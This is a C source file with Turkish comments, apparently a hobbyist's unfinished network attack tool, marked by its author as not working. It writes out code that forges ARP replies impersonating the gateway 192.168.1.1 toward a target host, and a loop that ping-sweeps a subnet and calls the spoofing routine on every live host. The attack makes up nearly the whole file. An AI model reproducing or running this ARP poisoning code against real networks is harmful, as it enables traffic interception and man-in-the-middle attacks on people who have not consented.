// #include "arp_spoof.h" --------------------çalışmıyor----------------------------------------
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

void get_mac(int sockfd, const char *iface, uint8_t *mac) {
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_ip(int sockfd, const char *iface, struct in_addr *ip) {
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    ioctl(sockfd, SIOCGIFADDR, &ifr);
    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
}
char* get_wifi_interface() {
    FILE *fp;
    static char iface[32];
    char line[256];

    fp = popen("iw dev | grep Interface | awk '{print $2}'", "r");
    if (fp == NULL) {
        perror("Komut çalıştırılamadı");
        return NULL;
    }

    if (fgets(iface, sizeof(iface), fp) != NULL) {
        // Satır sonu karakterini temizle
        iface[strcspn(iface, "\n")] = 0;
        pclose(fp);
        return iface;
    }

    pclose(fp);
    return NULL;
}

int arp_function(char *network_prefix) {
    const char *iface = get_wifi_interface();

    if (iface != NULL)  
    {
        printf("Kullanılan WiFi arayüzü: %s\n", iface);
        // Burada iface ile devam edebilirsin
    } 
    else 
    {
        fprintf(stderr, "WiFi arayüzü bulunamadı.\n");
    }

    const char *iface_ip = iface; // WiFi ise "wlan0"
    const char *target_ip_str = "192.168.1.5";//Hedef cihazın IP adresi.
    const char *spoof_ip_str = "192.168.1.1";//Sahte (spoofed) IP adresi

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    uint8_t src_mac[6];
    struct in_addr src_ip;
    get_mac(sockfd, iface, src_mac);
    get_ip(sockfd, iface, &src_ip);

    uint8_t buffer[42];
    struct ether_header *eth = (struct ether_header *)buffer;
    struct ether_arp *arp = (struct ether_arp *)(buffer + 14);

    // Ethernet Header
    memset(eth->ether_dhost, 0xff, 6); // Broadcast
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    // ARP Header
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);

    memcpy(arp->arp_sha, src_mac, 6); // Sender MAC
    inet_pton(AF_INET, spoof_ip_str, arp->arp_spa); // Sender IP (spoofed)

    memset(arp->arp_tha, 0xff, 6); // Target MAC bilinmiyorsa ff:ff:ff:ff:ff:ff
    inet_pton(AF_INET, target_ip_str, arp->arp_tpa); // Target IP

    struct sockaddr_ll device = {0};
    device.sll_ifindex = if_nametoindex(iface);
    device.sll_halen = ETH_ALEN;
    memset(device.sll_addr, 0xff, 6);

    sendto(sockfd, buffer, 42, 0, (struct sockaddr*)&device, sizeof(device));

    close(sockfd);
    printf("Sahte ARP reply gönderildi!\n");
    return 0;
}
int port_function_ip(char *network_prefix) 
{
    int start_port = 1;
    int end_port =  65535 ;
    int counter = 0;

    for (int i = 1; i <= 255; i++) 
    {
        char ip[16]; // IP adresi için yeterli alan
        snprintf(ip, sizeof(ip), "%s.%d", network_prefix, i); 

        char command[256];
        snprintf(command, sizeof(command), "ping -c 1 -s 0 -W 0.2 %s > /dev/null 2>&1", ip);
        if (system(command) == 0) 
        {
            arp_function(ip);

            fflush(stdout);

        } 
    }

    return 0;  
}